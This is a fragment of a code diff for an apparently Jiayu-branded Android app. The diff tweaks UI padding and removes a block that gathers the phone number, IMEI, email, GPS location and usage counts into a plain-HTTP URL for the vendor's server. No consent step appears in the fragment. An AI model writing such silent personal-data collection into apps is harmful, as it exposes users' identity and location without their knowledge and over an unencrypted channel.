+                b2.setPadding(550, 0, 0, 0);
+                b3.setPadding(550, 0, 0, 0);
+                b4.setPadding(455, 0, 0, 0);
+                b5.setPadding(360, 0, 0, 0);
+                b6.setPadding(170, 0, 0, 0);
+                b7.setPadding(390, 0, 0, 0);
+                b8.setPadding(290, 0, 0, 0);
+            }else{
+                t1.setPadding(290, 0, 0, 0);
+                b1.setPadding(290, 0, 0, 0);
+                b2.setPadding(290, 0, 0, 0);
+                b3.setPadding(290, 0, 0, 0);
+                b4.setPadding(200, 0, 0, 0);
+                b5.setPadding(190, 0, 0, 0);
+                b6.setPadding(170, 0, 0, 0);
+                b7.setPadding(200, 0, 0, 0);
+                b8.setPadding(175, 0, 0, 0);
             }
         }
 
-        String telef_apl="";
-        TelephonyManager tm = (TelephonyManager)this.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
-        telef_apl =  tm.getLine1Number();
-
-        String local_apl="";
-        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        List<String> providers = lm.getProviders(true);
-
-        /* Loop over the array backwards, and if you get an accurate location, then break out the loop*/
-        Location l = null;
-
-        for (int i=providers.size()-1; i>=0; i--) {
-            l = lm.getLastKnownLocation(providers.get(i));
-            if (l != null) break;
-        }
-        /*if(providers.size()>0) {
-            l = lm.getLastKnownLocation(providers.get(0));
-        }*/
-        if (l != null) {
-            local_apl =local_apl+ l.getLatitude();
-            local_apl =local_apl+ l.getLongitude();
-        }
-
-        String fecha_apl="";
-        String fecha="";
-        String dia=String.valueOf(Calendar.getInstance().get(Calendar.DAY_OF_MONTH));
-        String mes=String.valueOf(Calendar.getInstance().get(Calendar.MONTH)+1);
-        String anyo=String.valueOf(Calendar.getInstance().get(Calendar.YEAR));
-        if(dia.length()==1){
-            dia="0"+dia;
-        }
-        if(mes.length()==1){
-            mes="0"+mes;
-        }
-        ajustes=getSharedPreferences("JiayuesAjustes",Context.MODE_PRIVATE);
-        editorAjustes=ajustes.edit();
-        fecha_apl=ajustes.getString("fechaPrimerUso",dia+"/"+mes+"/"+anyo);
-        editorAjustes.putString("fechaPrimerUso",ajustes.getString("fechaPrimerUso",dia+"/"+mes+"/"+anyo));
-        editorAjustes.commit();
-        String conecta_apl="";
-        conecta_apl=String.valueOf(ajustes.getInt("aperturaAPP",0));
-        String cadHttp="http://www.jiayu.es/soporte/appimei.php?";
-
-        cadHttp=cadHttp+"mdl="+modelo_apl+"&imei="+imei_apl+"&email="+email_apl+"&tlf="+telef_apl+"&localiz="+local_apl+"&date="+fecha_apl+"&conecta="+conecta_apl+"*";
-        //Toast.makeText(getBaseContext(),cadHttp,Toast.LENGTH_LONG).show();
     }
+    /*@Override
+    public void onBackPressed() {
+        super.finish();
+    }*/
 }
